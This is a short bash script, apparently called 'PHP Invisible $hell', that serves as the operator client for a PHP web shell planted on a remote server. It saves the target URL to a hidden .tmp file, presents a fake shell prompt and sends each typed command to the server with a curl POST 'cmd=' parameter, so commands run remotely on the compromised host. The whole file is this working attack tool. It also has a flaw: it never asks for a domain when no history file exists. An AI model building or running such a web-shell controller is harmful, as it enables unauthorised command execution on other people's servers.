#!/bin/bash


echo "## PHP Invisible \$hell by omatr0n ##"
#checking if the temporary file exists
if [ -e .tmp ]
then
  #read file and save it into variable
  domain=$(cat .tmp)
  #ask for user input Y/n
  echo -n "History '$domain' found, do you want to use it? (Y/n)"
  read hist
  #make a decision based on user input
  case "$hist" in
	  n)
		#No => Ask for new domain
  		echo -n "Insert Domain & Path (http://www.example.com/index.php):"
  		read domain
		;;
	  #default do nothing
	  *) 
	  	;;
  esac
fi

echo "Running on $domain"
#creating temporary file
echo -n "$domain" > .tmp 
while true
do
echo -n "user@omatr0n$"
#aks for command to send to remote shell
read com
	#checks if command is exit
	case "$com" in
		exit)
			exit 1
			;;
		#default send command to remote shell	
		*)
			curl -X POST -d"cmd=$com" $domain
			;;

	esac

done
